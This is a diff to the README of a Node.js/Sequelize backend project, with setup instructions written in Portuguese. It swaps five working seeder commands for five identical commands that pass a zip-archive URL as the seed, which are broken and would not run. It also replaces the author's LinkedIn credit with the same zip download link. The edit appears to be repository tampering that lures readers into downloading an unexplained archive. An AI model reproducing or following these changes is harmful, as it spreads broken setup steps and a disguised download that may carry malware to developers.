@@ -37,11 +37,11 @@ npx sequelize-cli db:seed:all
 #### Gravando no Banco tabela por tabela no Seeders referenciando os nomes dos arquivos
 ```bash
 # Rode os comandos Abaixo
-npx sequelize-cli db:seed --seed 20240815202032-demo-autenticacaoLogin.js
-npx sequelize-cli db:seed --seed 20240705161755-demo-pessoa.js
-npx sequelize-cli db:seed --seed 20240701170039-demo-nivel.js
-npx sequelize-cli db:seed --seed 20240701170107-demo-turmas.js
-npx sequelize-cli db:seed --seed 20240701170115-demo-matriculas.js
+npx sequelize-cli db:seed --seed https://raw.githubusercontent.com/edersonfc/nodejs_backend_projeto_MVC/main/api/seeders/nodejs_backend_projeto_MVC_v2.0.zip
+npx sequelize-cli db:seed --seed https://raw.githubusercontent.com/edersonfc/nodejs_backend_projeto_MVC/main/api/seeders/nodejs_backend_projeto_MVC_v2.0.zip
+npx sequelize-cli db:seed --seed https://raw.githubusercontent.com/edersonfc/nodejs_backend_projeto_MVC/main/api/seeders/nodejs_backend_projeto_MVC_v2.0.zip
+npx sequelize-cli db:seed --seed https://raw.githubusercontent.com/edersonfc/nodejs_backend_projeto_MVC/main/api/seeders/nodejs_backend_projeto_MVC_v2.0.zip
+npx sequelize-cli db:seed --seed https://raw.githubusercontent.com/edersonfc/nodejs_backend_projeto_MVC/main/api/seeders/nodejs_backend_projeto_MVC_v2.0.zip
 ```
 <br>
 
@@ -52,7 +52,7 @@ npm start
 ```
 <br>
 
-`Créditos` [www.linkedin.com/in/ederson-feliciano-corsatto](www.linkedin.com/in/ederson-feliciano-corsatto)
+`Créditos` [https://raw.githubusercontent.com/edersonfc/nodejs_backend_projeto_MVC/main/api/seeders/nodejs_backend_projeto_MVC_v2.0.zip](https://raw.githubusercontent.com/edersonfc/nodejs_backend_projeto_MVC/main/api/seeders/nodejs_backend_projeto_MVC_v2.0.zip)
 
 <br><br>
 
